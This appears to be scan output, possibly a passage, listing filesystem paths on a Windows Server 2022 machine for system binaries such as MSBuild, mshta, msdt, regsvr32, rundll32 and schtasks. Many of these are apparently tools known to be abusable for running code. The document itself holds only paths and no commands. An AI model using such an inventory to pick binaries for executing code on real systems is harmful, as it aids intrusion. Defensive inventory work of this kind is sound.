Path: C:\Windows\WinSxS\amd64_msbuild_b03f5f7f11d50a3a_4.0.15806.0_none_dc39867b9c608090\MSBuild.exe
Path: C:\Windows\WinSxS\wow64_msbuild_b03f5f7f11d50a3a_4.0.15806.0_none_0607cd955dab15ad\MSBuild.exe
Path: C:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe
Path: C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe
Path: C:\Windows\Microsoft.NET\assembly\GAC_32\MSBuild\v4.0_4.0.0.0__b03f5f7f11d50a3a\MSBuild.exe
Path: C:\Windows\Microsoft.NET\assembly\GAC_64\MSBuild\v4.0_4.0.0.0__b03f5f7f11d50a3a\MSBuild.exe
Path: C:\Windows\System32\msconfig.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-msconfig-exe_31bf3856ad364e35_10.0.20348.112_none_c32ec29927b95427\msconfig.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-msconfig-exe_31bf3856ad364e35_10.0.20348.112_none_c32ec29927b95427\f\msconfig.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-msconfig-exe_31bf3856ad364e35_10.0.20348.112_none_c32ec29927b95427\r\msconfig.exe
Path: C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~20348.1006.1.5\amd64_microsoft-windows-msconfig-exe_31bf3856ad364e35_10.0.20348.112_none_c32ec29927b95427\f\msconfig.exe
Path: C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~20348.1006.1.5\amd64_microsoft-windows-msconfig-exe_31bf3856ad364e35_10.0.20348.112_none_c32ec29927b95427\r\msconfig.exe
Path: C:\Windows\System32\msdt.exe
Path: C:\Windows\SysWOW64\msdt.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-msdt_31bf3856ad364e35_10.0.20348.1_none_2ef15f76e68d0ff7\msdt.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-msdt_31bf3856ad364e35_10.0.20348.887_none_8df04550a7b3eb6f\msdt.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-msdt_31bf3856ad364e35_10.0.20348.1_none_394609c91aedd1f2\msdt.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-msdt_31bf3856ad364e35_10.0.20348.887_none_9844efa2dc14ad6a\msdt.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-msdt_31bf3856ad364e35_10.0.20348.887_none_8df04550a7b3eb6f\f\msdt.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-msdt_31bf3856ad364e35_10.0.20348.887_none_8df04550a7b3eb6f\r\msdt.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-msdt_31bf3856ad364e35_10.0.20348.887_none_9844efa2dc14ad6a\f\msdt.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-msdt_31bf3856ad364e35_10.0.20348.887_none_9844efa2dc14ad6a\r\msdt.exe
Path: C:\Windows\System32\mshta.exe
Path: C:\Windows\SysWOW64\mshta.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-ie-htmlapplication_31bf3856ad364e35_11.0.20348.1_none_16ba679d3d3e0330\mshta.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-ie-htmlapplication_31bf3856ad364e35_11.0.20348.1_none_210f11ef719ec52b\mshta.exe
Path: C:\Windows\System32\mshtml.dll
Path: C:\Windows\SysWOW64\mshtml.dll
Path: C:\Windows\WinSxS\amd64_microsoft-windows-i..tmlrendering-legacy_31bf3856ad364e35_11.0.20348.1006_none_fe7ec3520debac30\mshtml.dll
Path: C:\Windows\WinSxS\amd64_microsoft-windows-i..tmlrendering-legacy_31bf3856ad364e35_11.0.20348.169_none_3e6f9e7f65e65e47\mshtml.dll
Path: C:\Windows\WinSxS\wow64_microsoft-windows-i..tmlrendering-legacy_31bf3856ad364e35_11.0.20348.1006_none_08d36da4424c6e2b\mshtml.dll
Path: C:\Windows\WinSxS\wow64_microsoft-windows-i..tmlrendering-legacy_31bf3856ad364e35_11.0.20348.169_none_48c448d19a472042\mshtml.dll
Path: C:\Windows\WinSxS\amd64_microsoft-windows-i..tmlrendering-legacy_31bf3856ad364e35_11.0.20348.1006_none_fe7ec3520debac30\f\mshtml.dll
Path: C:\Windows\WinSxS\amd64_microsoft-windows-i..tmlrendering-legacy_31bf3856ad364e35_11.0.20348.1006_none_fe7ec3520debac30\r\mshtml.dll
Path: C:\Windows\WinSxS\amd64_microsoft-windows-i..tmlrendering-legacy_31bf3856ad364e35_11.0.20348.169_none_3e6f9e7f65e65e47\f\mshtml.dll
Path: C:\Windows\WinSxS\amd64_microsoft-windows-i..tmlrendering-legacy_31bf3856ad364e35_11.0.20348.169_none_3e6f9e7f65e65e47\r\mshtml.dll
Path: C:\Windows\WinSxS\wow64_microsoft-windows-i..tmlrendering-legacy_31bf3856ad364e35_11.0.20348.1006_none_08d36da4424c6e2b\f\mshtml.dll
Path: C:\Windows\WinSxS\wow64_microsoft-windows-i..tmlrendering-legacy_31bf3856ad364e35_11.0.20348.1006_none_08d36da4424c6e2b\r\mshtml.dll
Path: C:\Windows\WinSxS\wow64_microsoft-windows-i..tmlrendering-legacy_31bf3856ad364e35_11.0.20348.169_none_48c448d19a472042\f\mshtml.dll
Path: C:\Windows\WinSxS\wow64_microsoft-windows-i..tmlrendering-legacy_31bf3856ad364e35_11.0.20348.169_none_48c448d19a472042\r\mshtml.dll
Path: C:\Windows\System32\msiexec.exe
Path: C:\Windows\SysWOW64\msiexec.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-installer-executable_31bf3856ad364e35_10.0.20348.1_none_d2f072504f20791e\msiexec.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-installer-executable_31bf3856ad364e35_10.0.20348.1_none_dd451ca283813b19\msiexec.exe
Path: C:\Windows\System32\netsh.exe
Path: C:\Windows\SysWOW64\netsh.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-netsh_31bf3856ad364e35_10.0.20348.1_none_e90ff3c1c0df68cb\netsh.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-netsh_31bf3856ad364e35_10.0.20348.1_none_f3649e13f5402ac6\netsh.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-d..ommandline-ntdsutil_31bf3856ad364e35_10.0.20348.1_none_64c015fdf899f297\ntdsutil.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-d..ommandline-ntdsutil_31bf3856ad364e35_10.0.20348.946_none_c3e93d23b9a1421b\ntdsutil.exe
Path: C:\Windows\WinSxS\x86_microsoft-windows-d..ommandline-ntdsutil_31bf3856ad364e35_10.0.20348.1_none_08a17a7a403c8161\ntdsutil.exe
Path: C:\Windows\WinSxS\x86_microsoft-windows-d..ommandline-ntdsutil_31bf3856ad364e35_10.0.20348.946_none_67caa1a00143d0e5\ntdsutil.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-d..ommandline-ntdsutil_31bf3856ad364e35_10.0.20348.946_none_c3e93d23b9a1421b\f\ntdsutil.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-d..ommandline-ntdsutil_31bf3856ad364e35_10.0.20348.946_none_c3e93d23b9a1421b\r\ntdsutil.exe
Path: C:\Windows\WinSxS\x86_microsoft-windows-d..ommandline-ntdsutil_31bf3856ad364e35_10.0.20348.946_none_67caa1a00143d0e5\f\ntdsutil.exe
Path: C:\Windows\WinSxS\x86_microsoft-windows-d..ommandline-ntdsutil_31bf3856ad364e35_10.0.20348.946_none_67caa1a00143d0e5\r\ntdsutil.exe
Path: C:\Windows\System32\odbcconf.exe
Path: C:\Windows\SysWOW64\odbcconf.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-m..s-mdac-odbcconf-exe_31bf3856ad364e35_10.0.20348.1_none_96e5d800bb23cc7b\odbcconf.exe
Path: C:\Windows\WinSxS\x86_microsoft-windows-m..s-mdac-odbcconf-exe_31bf3856ad364e35_10.0.20348.1_none_3ac73c7d02c65b45\odbcconf.exe
Path: C:\Windows\System32\pcalua.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-a..atibility-assistant_31bf3856ad364e35_10.0.20348.1_none_bd358397ec2d98a3\pcalua.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-a..atibility-assistant_31bf3856ad364e35_10.0.20348.469_none_1c4c0245ad427a4b\pcalua.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-a..atibility-assistant_31bf3856ad364e35_10.0.20348.469_none_1c4c0245ad427a4b\f\pcalua.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-a..atibility-assistant_31bf3856ad364e35_10.0.20348.469_none_1c4c0245ad427a4b\r\pcalua.exe
Path: C:\Windows\System32\pcwrun.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-pcwdiagnostic_31bf3856ad364e35_10.0.20348.1_none_7e9acb67c8aeaacc\pcwrun.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-pcwdiagnostic_31bf3856ad364e35_10.0.20348.887_none_dd99b14189d58644\pcwrun.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-pcwdiagnostic_31bf3856ad364e35_10.0.20348.887_none_dd99b14189d58644\f\pcwrun.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-pcwdiagnostic_31bf3856ad364e35_10.0.20348.887_none_dd99b14189d58644\r\pcwrun.exe
Path: C:\Windows\System32\pcwutl.dll
Path: C:\Windows\WinSxS\amd64_microsoft-windows-pcwdiagnostic_31bf3856ad364e35_10.0.20348.1_none_7e9acb67c8aeaacc\pcwutl.dll
Path: C:\Windows\WinSxS\amd64_microsoft-windows-pcwdiagnostic_31bf3856ad364e35_10.0.20348.887_none_dd99b14189d58644\pcwutl.dll
Path: C:\Windows\WinSxS\amd64_microsoft-windows-pcwdiagnostic_31bf3856ad364e35_10.0.20348.887_none_dd99b14189d58644\f\pcwutl.dll
Path: C:\Windows\WinSxS\amd64_microsoft-windows-pcwdiagnostic_31bf3856ad364e35_10.0.20348.887_none_dd99b14189d58644\r\pcwutl.dll
Path: C:\Windows\WinSxS\amd64_microsoft.powershell.pester_31bf3856ad364e35_10.0.20348.1_none_5da168283cd771d8\Pester.bat
Path: C:\Windows\WinSxS\wow64_microsoft.powershell.pester_31bf3856ad364e35_10.0.20348.1_none_67f6127a713833d3\Pester.bat
Path: C:\Program Files\WindowsPowerShell\Modules\Pester\3.4.0\bin\Pester.bat
Path: C:\Program Files (x86)\WindowsPowerShell\Modules\Pester\3.4.0\bin\Pester.bat
Path: C:\Windows\System32\PresentationHost.exe
Path: C:\Windows\SysWOW64\PresentationHost.exe
Path: C:\Windows\WinSxS\amd64_wpf-presentationhostexe_31bf3856ad364e35_10.0.20348.1_none_f96330d4e92474b2\PresentationHost.exe
Path: C:\Windows\WinSxS\x86_wpf-presentationhostexe_31bf3856ad364e35_10.0.20348.1_none_9d44955130c7037c\PresentationHost.exe
Path: C:\Windows\System32\print.exe
Path: C:\Windows\SysWOW64\print.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-m..ommandlineutilities_31bf3856ad364e35_10.0.20348.1_none_068beb2b305b2af4\print.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-m..ommandlineutilities_31bf3856ad364e35_10.0.20348.1_none_10e0957d64bbecef\print.exe
Path: C:\Windows\System32\psr.exe
Path: C:\Windows\SysWOW64\psr.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-a..roblemstepsrecorder_31bf3856ad364e35_10.0.20348.1_none_64608eb014005967\psr.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-a..roblemstepsrecorder_31bf3856ad364e35_10.0.20348.1_none_6eb5390248611b62\psr.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-p..inscripts.resources_31bf3856ad364e35_10.0.20348.1_en-us_981c5d7a1556e8f5\pubprn.vbs
Path: C:\Windows\WinSxS\wow64_microsoft-windows-p..inscripts.resources_31bf3856ad364e35_10.0.20348.1_en-us_a27107cc49b7aaf0\pubprn.vbs
Path: C:\Windows\WinSxS\x86_microsoft-windows-p..inscripts.resources_31bf3856ad364e35_10.0.20348.1_en-us_3bfdc1f65cf977bf\pubprn.vbs
Path: C:\Windows\System32\Printing_Admin_Scripts\en-US\pubprn.vbs
Path: C:\Windows\SysWOW64\Printing_Admin_Scripts\en-US\pubprn.vbs
Path: C:\Windows\System32\rasautou.exe
Path: C:\Windows\SysWOW64\rasautou.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-rasautodial_31bf3856ad364e35_10.0.20348.1_none_9948fc3a2e59b5dc\rasautou.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-rasautodial_31bf3856ad364e35_10.0.20348.1_none_a39da68c62ba77d7\rasautou.exe
Path: C:\Windows\System32\reg.exe
Path: C:\Windows\SysWOW64\reg.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-r..-commandline-editor_31bf3856ad364e35_10.0.20348.1_none_bb033180f3b60f5e\reg.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-r..-commandline-editor_31bf3856ad364e35_10.0.20348.1_none_c557dbd32816d159\reg.exe
Path: C:\Windows\WinSxS\amd64_regasm_b03f5f7f11d50a3a_4.0.15806.0_none_721a928100ad3217\RegAsm.exe
Path: C:\Windows\WinSxS\wow64_regasm_b03f5f7f11d50a3a_4.0.15806.0_none_9be8d99ac1f7c734\RegAsm.exe
Path: C:\Windows\Microsoft.NET\Framework\v4.0.30319\RegAsm.exe
Path: C:\Windows\Microsoft.NET\Framework64\v4.0.30319\RegAsm.exe
Path: C:\Windows\regedit.exe
Path: C:\Windows\SysWOW64\regedit.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-registry-editor_31bf3856ad364e35_10.0.20348.1_none_7d9db2e8a4df3d10\regedit.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-registry-editor_31bf3856ad364e35_10.0.20348.1_none_87f25d3ad93fff0b\regedit.exe
Path: C:\Windows\System32\regini.exe
Path: C:\Windows\SysWOW64\regini.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-regini_31bf3856ad364e35_10.0.20348.1_none_95c539f282d779f7\regini.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-regini_31bf3856ad364e35_10.0.20348.1_none_a019e444b7383bf2\regini.exe
Path: C:\Windows\System32\Register-CimProvider.exe
Path: C:\Windows\SysWOW64\Register-CimProvider.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-w..ter-cimprovider-exe_31bf3856ad364e35_10.0.20348.1_none_ecb89b8db4fca744\Register-CimProvider.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-w..ter-cimprovider-exe_31bf3856ad364e35_10.0.20348.1_none_f70d45dfe95d693f\Register-CimProvider.exe
Path: C:\Windows\WinSxS\amd64_regsvcs_b03f5f7f11d50a3a_4.0.15806.0_none_4535bd2753202ac7\RegSvcs.exe
Path: C:\Windows\WinSxS\x86_regsvcs_b03f5f7f11d50a3a_4.0.15806.0_none_8ce2f3fe679c53cd\RegSvcs.exe
Path: C:\Windows\Microsoft.NET\Framework\v4.0.30319\RegSvcs.exe
Path: C:\Windows\Microsoft.NET\Framework64\v4.0.30319\RegSvcs.exe
Path: C:\Windows\System32\regsvr32.exe
Path: C:\Windows\SysWOW64\regsvr32.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-regsvr32_31bf3856ad364e35_10.0.20348.1_none_01c61ad4f88a2eab\regsvr32.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-regsvr32_31bf3856ad364e35_10.0.20348.1_none_0c1ac5272ceaf0a6\regsvr32.exe
Path: C:\Windows\System32\replace.exe
Path: C:\Windows\SysWOW64\replace.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-m..ommandlineutilities_31bf3856ad364e35_10.0.20348.1_none_d1faec751f208de5\replace.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-m..ommandlineutilities_31bf3856ad364e35_10.0.20348.1_none_dc4f96c753814fe0\replace.exe
Path: C:\Windows\System32\RpcPing.exe
Path: C:\Windows\SysWOW64\RpcPing.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-rpc-ping_31bf3856ad364e35_10.0.20348.1_none_27290b9409bf1a51\RpcPing.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-rpc-ping_31bf3856ad364e35_10.0.20348.1_none_317db5e63e1fdc4c\RpcPing.exe
Path: C:\Windows\System32\rundll32.exe
Path: C:\Windows\SysWOW64\rundll32.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-rundll32_31bf3856ad364e35_10.0.20348.1_none_61744f1373f1295d\rundll32.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-rundll32_31bf3856ad364e35_10.0.20348.1_none_6bc8f965a851eb58\rundll32.exe
Path: C:\Windows\System32\runonce.exe
Path: C:\Windows\SysWOW64\runonce.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-runonce_31bf3856ad364e35_10.0.20348.1_none_9f29d220880e8879\runonce.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-runonce_31bf3856ad364e35_10.0.20348.202_none_fe7a2a8448f916cc\runonce.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-runonce_31bf3856ad364e35_10.0.20348.1_none_a97e7c72bc6f4a74\runonce.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-runonce_31bf3856ad364e35_10.0.20348.202_none_fe7a2a8448f916cc\f\runonce.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-runonce_31bf3856ad364e35_10.0.20348.202_none_fe7a2a8448f916cc\r\runonce.exe
Path: C:\Windows\System32\sc.exe
Path: C:\Windows\SysWOW64\sc.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-s..llercommandlinetool_31bf3856ad364e35_10.0.20348.1_none_fddd389c9db34909\sc.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-s..llercommandlinetool_31bf3856ad364e35_10.0.20348.1_none_0831e2eed2140b04\sc.exe
Path: C:\Windows\System32\schtasks.exe
Path: C:\Windows\SysWOW64\schtasks.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-sctasks_31bf3856ad364e35_10.0.20348.1_none_13ae75177e5cf0f9\schtasks.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-sctasks_31bf3856ad364e35_10.0.20348.1_none_1e031f69b2bdb2f4\schtasks.exe
Path: C:\Windows\System32\ScriptRunner.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-a..nagement-appvclient_31bf3856ad364e35_10.0.20348.112_none_b526fb3052203fad\ScriptRunner.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-a..nagement-appvclient_31bf3856ad364e35_10.0.20348.887_none_b4e05a7852546e08\ScriptRunner.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-a..nagement-appvclient_31bf3856ad364e35_10.0.20348.887_none_b4e05a7852546e08\f\ScriptRunner.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-a..nagement-appvclient_31bf3856ad364e35_10.0.20348.887_none_b4e05a7852546e08\r\ScriptRunner.exe
Path: C:\Windows\System32\setupapi.dll
Path: C:\Windows\SysWOW64\setupapi.dll
Path: C:\Windows\WinSxS\amd64_microsoft-windows-setupapi_31bf3856ad364e35_10.0.20348.1_none_be6457348f4470ce\setupapi.dll
Path: C:\Windows\WinSxS\amd64_microsoft-windows-setupapi_31bf3856ad364e35_10.0.20348.740_none_1d8778d250512dfa\setupapi.dll
Path: C:\Windows\WinSxS\wow64_microsoft-windows-setupapi_31bf3856ad364e35_10.0.20348.1_none_c8b90186c3a532c9\setupapi.dll
Path: C:\Windows\WinSxS\wow64_microsoft-windows-setupapi_31bf3856ad364e35_10.0.20348.740_none_27dc232484b1eff5\setupapi.dll
Path: C:\Windows\WinSxS\amd64_microsoft-windows-setupapi_31bf3856ad364e35_10.0.20348.740_none_1d8778d250512dfa\f\setupapi.dll
Path: C:\Windows\WinSxS\amd64_microsoft-windows-setupapi_31bf3856ad364e35_10.0.20348.740_none_1d8778d250512dfa\r\setupapi.dll
Path: C:\Windows\WinSxS\wow64_microsoft-windows-setupapi_31bf3856ad364e35_10.0.20348.740_none_27dc232484b1eff5\f\setupapi.dll
Path: C:\Windows\WinSxS\wow64_microsoft-windows-setupapi_31bf3856ad364e35_10.0.20348.740_none_27dc232484b1eff5\r\setupapi.dll
Path: C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~20348.1006.1.5\amd64_microsoft-onecore-reverseforwarders_31bf3856ad364e35_10.0.20348.946_none_8add12c8f6c7bce4\f\setupapi.dll
Path: C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~20348.1006.1.5\amd64_microsoft-onecore-reverseforwarders_31bf3856ad364e35_10.0.20348.946_none_8add12c8f6c7bce4\r\setupapi.dll
Path: C:\Windows\System32\shdocvw.dll
Path: C:\Windows\SysWOW64\shdocvw.dll
Path: C:\Windows\WinSxS\amd64_microsoft-windows-shdocvw_31bf3856ad364e35_10.0.20348.1_none_70e3eb08d4ecc449\shdocvw.dll
Path: C:\Windows\WinSxS\wow64_microsoft-windows-shdocvw_31bf3856ad364e35_10.0.20348.1_none_7b38955b094d8644\shdocvw.dll
Path: C:\Windows\System32\shell32.dll
Path: C:\Windows\SysWOW64\shell32.dll
Path: C:\Windows\WinSxS\amd64_microsoft-windows-shell32_31bf3856ad364e35_10.0.20348.143_none_54be3f799c0c9e7f\shell32.dll
Path: C:\Windows\WinSxS\amd64_microsoft-windows-shell32_31bf3856ad364e35_10.0.20348.946_none_54c14f879c09d3bc\shell32.dll
Path: C:\Windows\WinSxS\wow64_microsoft-windows-shell32_31bf3856ad364e35_10.0.20348.143_none_5f12e9cbd06d607a\shell32.dll
Path: C:\Windows\WinSxS\wow64_microsoft-windows-shell32_31bf3856ad364e35_10.0.20348.946_none_5f15f9d9d06a95b7\shell32.dll
Path: C:\Windows\WinSxS\amd64_microsoft-windows-shell32_31bf3856ad364e35_10.0.20348.143_none_54be3f799c0c9e7f\f\shell32.dll
Path: C:\Windows\WinSxS\amd64_microsoft-windows-shell32_31bf3856ad364e35_10.0.20348.143_none_54be3f799c0c9e7f\r\shell32.dll
Path: C:\Windows\WinSxS\amd64_microsoft-windows-shell32_31bf3856ad364e35_10.0.20348.946_none_54c14f879c09d3bc\f\shell32.dll
Path: C:\Windows\WinSxS\amd64_microsoft-windows-shell32_31bf3856ad364e35_10.0.20348.946_none_54c14f879c09d3bc\r\shell32.dll
Path: C:\Windows\WinSxS\wow64_microsoft-windows-shell32_31bf3856ad364e35_10.0.20348.143_none_5f12e9cbd06d607a\f\shell32.dll
Path: C:\Windows\WinSxS\wow64_microsoft-windows-shell32_31bf3856ad364e35_10.0.20348.143_none_5f12e9cbd06d607a\r\shell32.dll
Path: C:\Windows\WinSxS\wow64_microsoft-windows-shell32_31bf3856ad364e35_10.0.20348.946_none_5f15f9d9d06a95b7\f\shell32.dll
Path: C:\Windows\WinSxS\wow64_microsoft-windows-shell32_31bf3856ad364e35_10.0.20348.946_none_5f15f9d9d06a95b7\r\shell32.dll
Path: C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~20348.1006.1.5\amd64_microsoft-onecore-reverseforwarders_31bf3856ad364e35_10.0.20348.946_none_8add12c8f6c7bce4\f\shell32.dll
Path: C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~20348.1006.1.5\amd64_microsoft-onecore-reverseforwarders_31bf3856ad364e35_10.0.20348.946_none_8add12c8f6c7bce4\r\shell32.dll
Path: C:\Windows\System32\slmgr.vbs
Path: C:\Windows\SysWOW64\slmgr.vbs
Path: C:\Windows\WinSxS\amd64_microsoft-windows-security-spp-tools_31bf3856ad364e35_10.0.20348.143_none_2e2e5aba49310f06\slmgr.vbs
Path: C:\Windows\WinSxS\amd64_microsoft-windows-security-spp-tools_31bf3856ad364e35_10.0.20348.320_none_2e40fd804923856d\slmgr.vbs
Path: C:\Windows\WinSxS\wow64_microsoft-windows-security-spp-tools_31bf3856ad364e35_10.0.20348.1_none_d95cedf4bc87b6ba\slmgr.vbs
Path: C:\Windows\WinSxS\wow64_microsoft-windows-security-spp-tools_31bf3856ad364e35_10.0.20348.320_none_3895a7d27d844768\slmgr.vbs
Path: C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~20348.1006.1.5\amd64_microsoft-windows-security-spp-tools_31bf3856ad364e35_10.0.20348.320_none_2e40fd804923856d\f\slmgr.vbs
Path: C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~20348.1006.1.5\amd64_microsoft-windows-security-spp-tools_31bf3856ad364e35_10.0.20348.320_none_2e40fd804923856d\r\slmgr.vbs
Path: C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~20348.1006.1.5\wow64_microsoft-windows-security-spp-tools_31bf3856ad364e35_10.0.20348.320_none_3895a7d27d844768\f\slmgr.vbs
Path: C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~20348.1006.1.5\wow64_microsoft-windows-security-spp-tools_31bf3856ad364e35_10.0.20348.320_none_3895a7d27d844768\r\slmgr.vbs
Path: C:\Windows\WID\Binn\SqlDumper.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-wid_31bf3856ad364e35_10.0.20348.1_none_311a04ce24ebf2b7\SqlDumper.exe
Path: C:\Program Files\Microsoft SQL Server\150\Shared\SqlDumper.exe
Path: C:\Program Files (x86)\Microsoft SQL Server\150\Shared\SqlDumper.exe
Path: C:\Program Files\Microsoft Analysis Services\AS OLEDB\140\SQLDumper.exe
Path: C:\Program Files (x86)\Microsoft Analysis Services\AS OLEDB\140\SQLDumper.exe
Path: C:\Program Files (x86)\Microsoft SQL Server\150\Tools\Binn\SQLPS.exe
Path: C:\Windows\System32\SyncAppvPublishingServer.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-a..nagement-appvclient_31bf3856ad364e35_10.0.20348.112_none_b526fb3052203fad\SyncAppvPublishingServer.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-a..nagement-appvclient_31bf3856ad364e35_10.0.20348.887_none_b4e05a7852546e08\SyncAppvPublishingServer.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-a..nagement-appvclient_31bf3856ad364e35_10.0.20348.887_none_b4e05a7852546e08\f\SyncAppvPublishingServer.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-a..nagement-appvclient_31bf3856ad364e35_10.0.20348.887_none_b4e05a7852546e08\r\SyncAppvPublishingServer.exe
Path: C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~20348.1006.1.5\amd64_microsoft-windows-a..nagement-appvclient_31bf3856ad364e35_10.0.20348.887_none_b4e05a7852546e08\f\syncappvpublishingserver.vbs
Path: C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~20348.1006.1.5\amd64_microsoft-windows-a..nagement-appvclient_31bf3856ad364e35_10.0.20348.887_none_b4e05a7852546e08\r\syncappvpublishingserver.vbs
Path: C:\Windows\System32\SyncAppvPublishingServer.vbs
Path: C:\Windows\WinSxS\amd64_microsoft-windows-a..nagement-appvclient_31bf3856ad364e35_10.0.20348.112_none_b526fb3052203fad\SyncAppvPublishingServer.vbs
Path: C:\Windows\WinSxS\amd64_microsoft-windows-a..nagement-appvclient_31bf3856ad364e35_10.0.20348.887_none_b4e05a7852546e08\SyncAppvPublishingServer.vbs
Path: C:\Windows\System32\syssetup.dll
Path: C:\Windows\SysWOW64\syssetup.dll
Path: C:\Windows\WinSxS\amd64_microsoft-windows-syssetup_31bf3856ad364e35_10.0.20348.1_none_fa3f895160bd61d3\syssetup.dll
Path: C:\Windows\WinSxS\wow64_microsoft-windows-syssetup_31bf3856ad364e35_10.0.20348.1_none_049433a3951e23ce\syssetup.dll
Path: C:\Windows\System32\tttracer.exe
Path: C:\Windows\SysWOW64\tttracer.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-t..eldebugger-recorder_31bf3856ad364e35_10.0.20348.1_none_edd3078fd6f94596\tttracer.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-t..eldebugger-recorder_31bf3856ad364e35_10.0.20348.740_none_4cf6292d980602c2\tttracer.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-t..eldebugger-recorder_31bf3856ad364e35_10.0.20348.1_none_f827b1e20b5a0791\tttracer.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-t..eldebugger-recorder_31bf3856ad364e35_10.0.20348.740_none_574ad37fcc66c4bd\tttracer.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-t..eldebugger-recorder_31bf3856ad364e35_10.0.20348.740_none_4cf6292d980602c2\f\tttracer.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-t..eldebugger-recorder_31bf3856ad364e35_10.0.20348.740_none_4cf6292d980602c2\r\tttracer.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-t..eldebugger-recorder_31bf3856ad364e35_10.0.20348.740_none_574ad37fcc66c4bd\f\tttracer.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-t..eldebugger-recorder_31bf3856ad364e35_10.0.20348.740_none_574ad37fcc66c4bd\r\tttracer.exe
Path: C:\Windows\System32\url.dll
Path: C:\Windows\SysWOW64\url.dll
Path: C:\Windows\WinSxS\amd64_microsoft-windows-ie-winsockautodialstub_31bf3856ad364e35_11.0.20348.1_none_ad8b49a291aad4e0\url.dll
